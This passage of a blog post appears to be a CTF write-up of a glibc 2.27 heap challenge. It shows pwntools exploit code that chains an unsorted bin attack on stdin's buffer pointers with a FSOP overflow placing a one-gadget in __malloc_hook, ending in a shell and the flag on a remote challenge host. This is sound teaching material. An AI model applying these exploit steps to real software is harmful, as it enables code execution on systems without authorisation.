class="line">  _flags2 = 16,</span><br><span class="line">  _old_offset = -1,</span><br><span class="line">  _cur_column = 0,</span><br><span class="line">  _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">  _shortbuf = &quot;\n&quot;,</span><br><span class="line">  _lock = 0x7ffff7dd18d0 &lt;_IO_stdfile_0_lock&gt;,</span><br><span class="line">  _offset = -1,</span><br><span class="line">  _codecvt = 0x0,</span><br><span class="line">  _wide_data = 0x7ffff7dcfae0 &lt;_IO_wide_data_0&gt;,</span><br><span class="line">  _freeres_list = 0x0,</span><br><span class="line">  _freeres_buf = 0x0,</span><br><span class="line">  __pad5 = 0,</span><br><span class="line">  _mode = -1,</span><br><span class="line">  _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>As you can see right above and according to the source code showed previously, <code>_IO_stdin-&gt;_IO_buf_base</code> points toward <code>_IO_stdin-&gt;_shortbuf</code>, an internal buffer directly in <code>stdin</code>. And <code>&amp;unsortedbin &gt; _IO_buf_base &gt; stdin</code>. If you do not understand fully my explanations, I advise you to take a look at <a target="_blank" rel="noopener" href="https://nightrainy.github.io/2019/08/07/play-withe-file-structure-%E6%90%AC%E8%BF%90/">this great article</a>.</p>
<p>Then we should be able to control every bytes between <code>&amp;stdin-&gt;_shortbuf</code> and <code>&amp;unsortedbin</code>. And the incredible thing to note is that in this small range, there is what every heap pwner is always looking for: <code>__malloc_hook</code> !!</p>
<p>Then we just have to overwrite the pointers inside <code>stdin</code>, <code>_IO_wide_data_0</code> and <code>__memalign_hook</code> to finally reach <code>__malloc_hook</code> and write the address of a one-gadget !</p>
<h2 id="Unsorted-bin-attack-on-stdin-IO-buf-end"><a href="#Unsorted-bin-attack-on-stdin-IO-buf-end" class="headerlink" title="Unsorted bin attack on stdin-&gt;_IO_buf_end"></a>Unsorted bin attack on stdin-&gt;_IO_buf_end</h2><p>Here was theory, let’s see how we can do that. To understand unsorted bin attack <a target="_blank" rel="noopener" href="https://squarepants0.github.io/2020/10/20/unsorted-bin-attack/">here</a> is a good article about unsorted bin attack. The unsorted bin attack using partial unlink is basically:</p>
<ul>
<li>overwrite the backward pointer of the last chunk in the unsorted bin by <code>&amp;target - 0x10</code></li>
<li>request the <strong>exact</strong> size of the last chunk in the unsorted bin</li>
<li>It should write at <code>&amp;target</code> the address of the unsorted bin</li>
</ul>
<p>An essential thing to note is that if there is no chunks in your fastbin &#x2F; smallbin and that you’re requesting a fastbin&#x2F;smallbin-sized chunk, the unsorted bin will be inspected and if the last chunk doesn’t fit the request, the program will most of the time issues a <code>malloc(): memory corruption</code>. Anyway the best thing to do is to take a look at the <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3519">code</a>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// It checks first fastbin then smallbin then unsorted bin</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (chunksize_nomask (victim)</span><br><span class="line">				   &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): memory corruption&quot;</span>);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">		set_non_main_arena (victim);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">	      <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment">		 We may return one of these chunks later.  */</span></span><br><span class="line">	      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">		  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">		&#123;</span><br><span class="line">		  tcache_put (victim, tc_idx);</span><br><span class="line">		  return_cached = <span class="number">1</span>;</span><br><span class="line">		  <span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	      <span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">	[...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>According to what I said earlier, the goal is to replace <code>stdin-&gt;_IO_buf_end</code> with <code>&amp;unsortedbin</code> which means we have to write to the backward pointer of the last chunk in the unsorted bin (chunk_2) <code>&amp;stdin-&gt;_IO_buf_end - 0x10</code>. To do so we can trigger a write after free primitive by taking back <code>chunk_2</code> from the unsorted bin to the fastbin:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Before:</span></span><br><span class="line"><span class="string">0x30: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0</span></span><br><span class="line"><span class="string">0x40: 0x555555608560 —▸ 0x5555556085a0 ◂— 0x0</span></span><br><span class="line"><span class="string">unsortedbin</span></span><br><span class="line"><span class="string">all: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="number">56</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">55</span>) <span class="comment"># pop it to access to chunk_1</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, <span class="number">56</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">56</span> + <span class="string">b&quot;\x31&quot;</span>) <span class="comment"># restore valid fastbin chunk part of the 0x30 freelist</span></span><br><span class="line"><span class="comment"># put it back to the fastbin </span></span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>, <span class="number">40</span>, pwn.p64(libc + <span class="number">0x3ebca0</span>) + pwn.p64(stdin + <span class="number">0x40</span> - <span class="number">0x10</span>))</span><br><span class="line"><span class="comment"># Write after free, &amp;stdin-&gt;_IO_buf_end = stdin + 0x40, minus 0x10 point to the fake header</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">After:</span></span><br><span class="line"><span class="string">0x30: 0x7ffff7dcfca0 (main_arena+96) —▸ 0x5555556085e0 ◂— 0x7ffff7dcfca0</span></span><br><span class="line"><span class="string">unsortedbin</span></span><br><span class="line"><span class="string">all [corrupted]</span></span><br><span class="line"><span class="string">FD: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0</span></span><br><span class="line"><span class="string">BK: 0x5555556085e0 —▸ 0x7ffff7dcfa30 (_IO_2_1_stdin_+48) ◂— 0x0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>As you can read right above, the <code>chunk_2</code> has its backward pointer set to <code>&amp;stdin-&gt;_IO_buf_end - 0x10</code>. To achieve the partial unlink we just have to request a <code>0x30</code> sized chunk with nothing in the fastbin freelists. That’s the last step of the unsortedbin attack, clean out the fastbin:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Before: same as above</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># == clean fastbin</span></span><br><span class="line"></span><br><span class="line">freexalloc(<span class="number">5</span>, <span class="number">560</span>, <span class="string">b&quot;&quot;</span>, doubleFree=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">freexalloc(<span class="number">4</span>, <span class="number">560</span>, <span class="string">b&quot;&quot;</span>, doubleFree=<span class="literal">True</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">56</span>, <span class="string">b&quot;1&quot;</span>*<span class="number">56</span> + <span class="string">b&quot;\x40&quot;</span>)</span><br><span class="line"></span><br><span class="line">freexalloc(<span class="number">5</span>, <span class="number">560</span>, <span class="string">b&quot;&quot;</span>, doubleFree=<span class="literal">True</span>)</span><br><span class="line">add(<span class="number">12</span>, <span class="number">56</span>, pwn.p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">freexalloc(<span class="number">4</span>, <span class="number">560</span>, <span class="string">b&quot;&quot;</span>, doubleFree=<span class="literal">True</span>)</span><br><span class="line">add(<span class="number">13</span>, <span class="number">56</span>, <span class="string">b&quot;1&quot;</span>*<span class="number">56</span> + <span class="string">b&quot;\x30&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">14</span>, <span class="number">40</span>, <span class="string">b&quot;1&quot;</span>*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># == clean fastbin</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">fastbins</span></span><br><span class="line"><span class="string">0x30: 0x0</span></span><br><span class="line"><span class="string">0x40: 0x0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>Now we just have to ask for a <code>0x30</code> sized chunk:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">3</span>, <span class="number">40</span>, <span class="string">b&quot;1337&quot;</span>, hang=<span class="literal">True</span>)</span><br><span class="line">pwn.log.info(<span class="string">f&quot;unsortedbin attack done on: <span class="subst">&#123;<span class="built_in">hex</span>(stdin + <span class="number">0x40</span> - <span class="number">0x10</span>)&#125;</span>&quot;</span>)</span><br><span class="line">pwn.log.info(<span class="string">f&quot;Enjoy your shell!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">After:</span></span><br><span class="line"><span class="string">0x7ffff7dcfa40 &lt;_IO_2_1_stdin_+64&gt;:	0x00007ffff7dcfca0 &lt;- stdin-&gt;_IO_buf_end</span></span><br><span class="line"><span class="string">0x7ffff7dcfca0 &lt;main_arena+96&gt;:	0x00005555556086b0 &lt;- unsortedbin</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="FSOP-PROFIT"><a href="#FSOP-PROFIT" class="headerlink" title="FSOP + PROFIT"></a>FSOP + PROFIT</h2><p>The last part is very easy, we just have to overflow up to <code>&amp;__malloc_hook</code> to write the one-gadget:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">io.sendline(<span class="string">b&quot;&quot;</span>) </span><br><span class="line">io.recvuntil(<span class="string">b&quot;&gt;&gt; &quot;</span>) </span><br><span class="line">io.send( </span><br><span class="line">        <span class="string">b&quot;4\n\x00\x00\x00&quot;</span> + </span><br><span class="line">        pwn.p64(libc + <span class="number">0x3ed8d0</span>) + </span><br><span class="line">        pwn.p64(<span class="number">0xffffffffffffffff</span>) + </span><br><span class="line">        pwn.p64(<span class="number">0</span>) + </span><br><span class="line">        pwn.p64(libc + <span class="number">0x3ebae0</span>) + </span><br><span class="line">        pwn.p64(<span class="number">0</span>) * <span class="number">3</span> + </span><br><span class="line">        pwn.p64(<span class="number">0x00000000ffffffff</span>) + </span><br><span class="line">        pwn.p64(<span class="number">0</span>) * <span class="number">2</span> + </span><br><span class="line">        pwn.p64(libc + <span class="number">0x3e82a0</span>) + </span><br><span class="line">        pwn.p8(<span class="number">0</span>) * <span class="number">0x150</span> +  </span><br><span class="line">        <span class="comment"># !!!!! </span></span><br><span class="line">        pwn.p64(libc + <span class="number">0x10a38c</span>) <span class="comment"># &lt;- one-gadget</span></span><br><span class="line">        <span class="comment">#pwn.p64(libc + 0x4f322) </span></span><br><span class="line">        <span class="comment"># pwn.p64(0x1337) </span></span><br><span class="line">        )</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>The <code>4\n\x00\x00\x00</code> corresponds to the option that asks for the huge chunk (we cannot allocate standards chunks anymore) which will trigger <code>__malloc_hook</code> :).</p>
<p>Which gives:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@3b9bf5405b71:/mnt# python3 exploit.py REMOTE HOST=167.172.56.180 PORT=30332</span><br><span class="line">[*] &#x27;/mnt/once_and_for_all&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RUNPATH:  b&#x27;/mnt/out&#x27;</span><br><span class="line">[+] Opening connection to 167.172.56.180 on port 30332: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">How much space do you need for this massive weapon: Adding to your inventory..</span><br><span class="line">$ id</span><br><span class="line">uid=100(ctf) gid=101(ctf)</span><br><span class="line">$ ls</span><br><span class="line">flag.txt</span><br><span class="line">glibc</span><br><span class="line">once_and_for_all</span><br><span class="line">$ cat flag.txt</span><br><span class="line">HTB&#123;m4y_th3_f0rc3_b3_w1th_B0Nn13!&#125;</span><br></pre></td></tr></table></figure>

<p>Find the tasks and the final exploit <a target="_blank" rel="noopener" href="https://github.com/ret2school/ctf/blob/master/2022/apocalypse/onceAndmore/">here</a> and <a target="_blank" rel="noopener" href="https://github.com/ret2school/ctf/blob/master/2022/apocalypse/onceAndmore/exploit.py">here</a>.</p>

        
      </div>

         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/posts/kmem_cache/"
      title="[Linux kernel side notes - SLUB] kmem_cache"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        [Linux kernel side notes - SLUB] kmem_cache
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/posts/bookwriter/"
      title="[pwnable - pwn] Bookwriter"
     >

    <p class="title-text">
      
        [pwnable - pwn] Bookwriter
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>

 
    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2023 nasm<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>

    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
        <span class="material-symbols-rounded">keyboard_arrow_up</span>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>
